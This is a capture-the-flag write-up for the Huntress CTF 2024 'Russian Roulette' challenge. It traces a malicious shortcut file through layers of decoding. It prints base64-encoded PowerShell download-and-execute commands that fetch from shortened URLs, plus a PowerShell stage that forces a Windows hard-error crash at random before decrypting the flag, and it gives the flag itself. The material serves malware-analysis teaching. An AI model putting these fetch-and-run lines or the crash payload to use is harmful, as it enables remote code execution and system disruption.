# Russian Roulette

![image](https://github.com/user-attachments/assets/1f7046f6-250d-4a91-aee6-7cb5de7b8726)


Download: [russian_roulette.zip](https://raw.githubusercontent.com/LazyTitan33/CTF-Writeups/refs/heads/main/Huntress-CTF-2024/challenge-files/russian_roulette.zip)

## My Solution

Within the zip file, we find a .lnk file which we read and see a base64 string:  

![image](https://github.com/user-attachments/assets/cdc7d24d-bad0-4f04-abbf-1f91604205a5)

Decoding that string shows us an Invoke-WebRequest made on a specific domain and file which is stored locally and executed.

```bash
echo aQB3AHIAIABpAHMALgBnAGQALwB6AGQANABoAFoAbgAgAC0AbwAgACQAZQBuAHYAOgBUAE0AUAAvAC4AYwBtAGQAOwAmACAAJABlAG4AdgA6AFQATQBQAC8ALgBjAG0AZAA=|base64 -d
```

![image](https://github.com/user-attachments/assets/4d349a5b-7dd8-4e27-883f-d68e5c663f49)

We use curl with the `-L` flag to follow redirects and try and see what this file is. 

![image](https://github.com/user-attachments/assets/0eb0e579-89a6-40e2-b3c4-d8d5f30734a1)

It starts with `cls` and `@echo off` commands so this tells us it's a batch script that clears the screens and disables echoing the commands in the terminal.

The lines starting with `::` are comments so we ignore those. I've saved the file locally and removed the `cls` and `echo off` because I want to see what it does.

![image](https://github.com/user-attachments/assets/cc757795-c212-462c-9439-2bfbcb7d342c)

I run it in my [CommandoVM](https://github.com/mandiant/commando-vm) and quickly notice this line which executes a base64 encoded powershell command.

![image](https://github.com/user-attachments/assets/ee255930-087c-4fd1-87ea-24ef4258e479)

We decode that string again and see another file being invoked:

```bash
echo aQB3AHIAIABpAHMALgBnAGQALwBRAFIARAB5AGkAUAB8AGkAZQB4AA==|base64 -d
```

![image](https://github.com/user-attachments/assets/213ba6a4-90d2-455b-8a35-7bcab86727b8)

We curl this one down as well and see powershell syntax:

![image](https://github.com/user-attachments/assets/6f23f72e-f598-4e9d-9189-b3442ac1823c)

```powershell
$s='using System;using System.Text;using System.Security.Cryptography;using System.Runtime.InteropServices;using System.IO;
public class X{[DllImport("ntdll.dll")]public static extern uint RtlAdjustPrivilege(int p,bool e,bool c,out bool o);
[DllImport("ntdll.dll")]public static extern uint NtRaiseHardError(uint e,uint n,uint u,IntPtr p,uint v,out uint r);public static unsafe string Shot(){bool o;uint r;RtlAdjustPrivilege(19,true,false,out o);
NtRaiseHardError(0xc0000022,0,0,IntPtr.Zero,6,out r);
byte[]c=Convert.FromBase64String("RNo8TZ56Rv+EyZW73NocFOIiNFfL45tXw24UogGdHkswea/WhnNhCNwjQn1aWjfw");
byte[]k=Convert.FromBase64String("/a1Y+fspq/NwlcPwpaT3irY2hcEytktuH7LsY+NlLew=");
byte[]i=Convert.FromBase64String("9sXGmK4q9LdYFdOp4TSsQw==");
using(Aes a=Aes.Create()){a.Key=k;a.IV=i;ICryptoTransform d=a.CreateDecryptor(a.Key,a.IV);
using(var m=new MemoryStream(c))using(var y=new CryptoStream(m,d,CryptoStreamMode.Read))using(var s=new StreamReader(y)){return s.ReadToEnd();}}}}';
$c=New-Object System.CodeDom.Compiler.CompilerParameters;$c.CompilerOptions='/unsafe';
$a=Add-Type -TypeDefinition $s -Language CSharp -PassThru -CompilerParameters $c;
if((Get-Random -Min 1 -Max 7) -eq 1){[X]::Shot()}Start-Process "powershell.exe"
```

Within this powershell syntax we can notice a `c`, a `k` and an `i` all having base64 encoded strings. Seeing the AES line below those, we can easily tell what these are:  

ciphertext: `RNo8TZ56Rv+EyZW73NocFOIiNFfL45tXw24UogGdHkswea/WhnNhCNwjQn1aWjfw`  
key: `/a1Y+fspq/NwlcPwpaT3irY2hcEytktuH7LsY+NlLew=`  
IV: `9sXGmK4q9LdYFdOp4TSsQw==`  


We put these in [cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)AES_Decrypt(%7B'option':'Base64','string':'%20/a1Y%2Bfspq/NwlcPwpaT3irY2hcEytktuH7LsY%2BNlLew%3D'%7D,%7B'option':'Base64','string':'9sXGmK4q9LdYFdOp4TSsQw%3D%3D'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=Uk5vOFRaNTZSditFeVpXNzNOb2NGT0lpTkZmTDQ1dFh3MjRVb2dHZEhrc3dlYS9XaG5OaENOd2pRbjFhV2pmdw) and get our flag:  

![image](https://github.com/user-attachments/assets/dfb05673-0dc7-42e9-9fe4-019819e74baa)

`flag{4e4f266d44717ff3af8bd92d292b79ec}`
